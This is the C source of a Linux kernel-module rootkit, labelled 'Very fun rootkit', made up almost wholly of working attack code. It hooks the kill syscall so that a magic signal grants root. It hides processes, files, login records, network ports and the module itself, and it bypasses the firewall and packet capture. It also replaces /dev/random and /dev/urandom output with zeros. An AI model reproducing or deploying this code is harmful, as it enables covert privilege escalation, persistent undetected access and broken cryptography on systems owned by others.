#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/threads.h>
#include <linux/file.h>
#include <linux/filter.h>
#include <linux/ftrace.h>
#include <net/sock.h>
#include <net/tcp.h>
#include "capabilities/privilege.h"
#include "capabilities/unloading.h"
#include "capabilities/fw_bypass.h"
#include "capabilities/hiding/dentry.h"
#include "capabilities/hiding/login.h"
#include "hooking.h"
#include "state.h"
#include "utils.h"
#include "config.h"

#ifndef ROOTI_DEBUG_SHOWME
#include "capabilities/hiding/module.h"
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");
MODULE_INFO(intree, "Y");

// Unused signal numbers which can be used by the rootkit for its own purposes
enum rooti_signal {
    ROOTI_SIG_PROC_UNSTICK  = 60,
    ROOTI_SIG_PROC_STICK    = 61,
    ROOTI_SIG_PROC_UNHIDE   = 62,
    ROOTI_SIG_PROC_HIDE     = 63,
    ROOTI_SIG_PROC_PE       = 64
};

struct inode *utmp_inode;
struct inode *proc_inode;

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
                              struct packet_type *pt, struct net_device *orig_dev);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                               struct packet_type *pt, struct net_device *orig_dev);

static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
static void (*orig_do_exit)(long code);

#ifndef ROOTI_DEBUG_SHOWME
static int (*orig_kallsyms_seq_show)(struct seq_file *m, void *p);
#endif

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;

    switch (sig)
    {
    case ROOTI_SIG_PROC_PE:
        return rooti_elevate_privilege();
    case ROOTI_SIG_PROC_HIDE:
        return rooti_pid_list_add(current->pid, &rooti_hidden_pids);
    case ROOTI_SIG_PROC_UNHIDE:
        rooti_pid_list_del(current->pid, &rooti_hidden_pids);
        return 0;
    case ROOTI_SIG_PROC_STICK:
        return rooti_pid_list_add(current->pid, &rooti_sticky_pids);
    case ROOTI_SIG_PROC_UNSTICK:
        rooti_pid_list_del(current->pid, &rooti_sticky_pids);
        return 0;
    default:
        return orig_kill(regs);
    }
}

static asmlinkage long hook_pread64(const struct pt_regs *regs) {
    int fd = regs->di;
    char *user_buf = (char *)regs->si;
    size_t count = regs->dx;
    struct file *file;

    size_t nread = orig_pread64(regs);
    if (nread < 0)
        return nread;

    file = fget(fd);
    if (file == NULL) {
        ROOTI_DEBUG("fget() failed");
        return nread;
    }

    if (file->f_inode == utmp_inode)
        rooti_hide_login_entry(user_buf, count);

    fput(file);
    return nread;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    int fd = regs->di;
    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
    struct file *file;
    int ret;

    int nread = orig_getdents64(regs);
    if (nread < 0)
        return nread;

    file = fget(fd);
    if (file == NULL) {
        ROOTI_DEBUG("fget() failed");
        return nread;
    }

    ret = rooti_hide_dir_entries(user_buf, nread, file->f_inode == proc_inode);

    fput(file);
    return ret;
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    if (socket == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);

    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
        if (ROOTI_HIDDEN_TCP_PORTS[i] == socket->sk_num) {
            return 0;
        }
    }

    return orig_tcp4_seq_show(seq, v);
}

static int hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    if (socket == SEQ_START_TOKEN)
       return orig_udp4_seq_show(seq, v);

    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
        if (ROOTI_HIDDEN_UDP_PORTS[i] == socket->sk_num) {
            return 0;
        }
    }

    return orig_udp4_seq_show(seq, v);
}

static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
                           struct packet_type *pt, struct net_device *orig_dev)
{
    enum rooti_net_rule_action action;
    rooti_match_packet(skb, &ROOTI_PCAP_POLICY, &action);

    switch (action)
    {
    case ROOTI_PACKET_DROP:
        kfree_skb(skb);
        return 0;
    case ROOTI_PACKET_ACCEPT:
        return orig_packet_rcv(skb, dev, pt, orig_dev);
    default:
        BUG();
    }
}

static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                           struct packet_type *pt, struct net_device *orig_dev)
{
    enum rooti_net_rule_action action;
    rooti_match_packet(skb, &ROOTI_PCAP_POLICY, &action);

    switch (action)
    {
    case ROOTI_PACKET_DROP:
        kfree_skb(skb);
        return 0;
    case ROOTI_PACKET_ACCEPT:
        return orig_tpacket_rcv(skb, dev, pt, orig_dev);
    default:
        BUG();
    }
}

// Should really be flagged as noreturn but that raises an objtool warning
static void hook_do_exit(long code)
{
    bool should_unload = rooti_pid_list_contains(current->pid, &rooti_sticky_pids);
    rooti_pid_list_del(current->pid, &rooti_hidden_pids);
    rooti_pid_list_del(current->pid, &rooti_sticky_pids);

    if (should_unload)
        rooti_self_destruct();

    orig_do_exit(code);
}

static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
{
    int ret;
    size_t len = iov_iter_count(iter);
    char *kernel_buf = kzalloc(len, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    ret = copy_to_iter(kernel_buf, len, iter);
    if (ret == 0) {
        ROOTI_DEBUG("copy_to_iter() failed: %d", ret);
        kfree(kernel_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    return len;
}

#ifndef ROOTI_DEBUG_SHOWME
static int hook_kallsyms_seq_show(struct seq_file *m, void *p)
{
    // Copied from kernel
    struct kallsym_iter {
    	loff_t pos;
    	loff_t pos_mod_end;
    	loff_t pos_ftrace_mod_end;
    	loff_t pos_bpf_end;
    	unsigned long value;
    	unsigned int nameoff;
    	char type;
    	char name[KSYM_NAME_LEN];
    	char module_name[MODULE_NAME_LEN];
    	int exported;
    	int show_value;
    };

    struct kallsym_iter *iter = m->private;

    if (iter->module_name[0] &&
        strncmp(iter->module_name, THIS_MODULE->name, MODULE_NAME_LEN) == 0) {
            return 0;
    }

    return orig_kallsyms_seq_show(m, p);
}
#endif

struct rooti_func_hook rooti_func_hooks[] = {
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
    ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    ROOTI_FUNC_HOOK("packet_rcv", hook_packet_rcv, &orig_packet_rcv),
    ROOTI_FUNC_HOOK("tpacket_rcv", hook_tpacket_rcv, &orig_tpacket_rcv),
    ROOTI_FUNC_HOOK("do_exit", hook_do_exit, &orig_do_exit),
    ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
    ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
};

static int __init rooti_init(void)
{
    int err;
    struct path path;

    err = kern_path("/var/run/utmp", LOOKUP_FOLLOW, &path);
    if (err) {
        ROOTI_DEBUG("kern_path() failed: %d", err);
        return err;
    }
    utmp_inode = path.dentry->d_inode;

    err = kern_path("/proc", LOOKUP_FOLLOW, &path);
    if (err) {
        ROOTI_DEBUG("kern_path() failed: %d", err);
        return err;
    }
    proc_inode = path.dentry->d_inode;

    err = rooti_resolve_kln_addr();
    if (err) {
        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", err);
        return err;
    }

    err = rooti_install_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
    if (err) {
        ROOTI_DEBUG("rooti_install_func_hooks() failed: %d", err);
        return err;
    }

    err = rooti_install_fw_bypass_hooks();
    if (err) {
        ROOTI_DEBUG("rooti_install_fw_bypass_hooks() failed: %d", err);
        return err;
    }

#ifndef ROOTI_DEBUG_SHOWME
    err = rooti_hideme();
    if (err)
        return err;

    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, -ENOENT);

    orig_kallsyms_seq_show = __kallsyms_op->show;

    rooti_unprotect_memory();
    __kallsyms_op->show = hook_kallsyms_seq_show;
    rooti_protect_memory();
#endif

    ROOTI_DEBUG("init");

    return 0;
}

static void __exit rooti_exit(void)
{
#ifndef ROOTI_DEBUG_SHOWME
    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, );

    rooti_unprotect_memory();
    __kallsyms_op->show = orig_kallsyms_seq_show;
    rooti_protect_memory();
#endif

    rooti_uninstall_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
    rooti_uninstall_fw_bypass_hooks();

    // Release any remaining records
    rooti_pid_list_clear(&rooti_hidden_pids);
    rooti_pid_list_clear(&rooti_sticky_pids);

    ROOTI_DEBUG("exit");
}

module_init(rooti_init);
module_exit(rooti_exit);
